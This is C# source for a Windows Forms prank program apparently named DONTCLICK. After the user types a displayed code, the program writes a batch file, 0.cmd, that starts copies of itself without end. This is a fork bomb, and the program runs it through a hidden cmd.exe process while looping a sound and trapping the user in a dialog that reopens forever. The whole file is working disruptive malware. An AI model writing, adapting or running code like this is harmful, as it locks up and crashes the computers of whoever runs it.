using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Media;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DONTCLICK
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
        public string rdPassKey;
        public Process p=new Process();

        private void Form1_Load(object sender, EventArgs e)
        {
            Random rd = new Random();
            rdPassKey = rd.Next().ToString().Substring(3, 6);
            label1.Text = "输入 "+rdPassKey+" 以继续.";

            #region Process CMD Conf
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardInput = true;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.RedirectStandardError = true;
            p.StartInfo.CreateNoWindow = true;
            p.Start();
            #endregion
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (textBox1.Text == rdPassKey)
            {
                Form2 fm2 = new Form2();
                File.Create(@".\wswzj.cmd").Close();
                StreamWriter swriter = new StreamWriter(@".\0.cmd");
                swriter.WriteLine("start 0");
                swriter.WriteLine(".\\0");
                swriter.Close();
                Stream ssm = global::DONTCLICK.Properties.Resources.monofly;
                SoundPlayer plyr = new SoundPlayer(ssm);
                plyr.Load();
                plyr.PlayLooping();
                p.StandardInput.WriteLine(".\\0");
                while (true)
                {
                    fm2.ShowDialog();
                }
                
            }
        }
    }
}
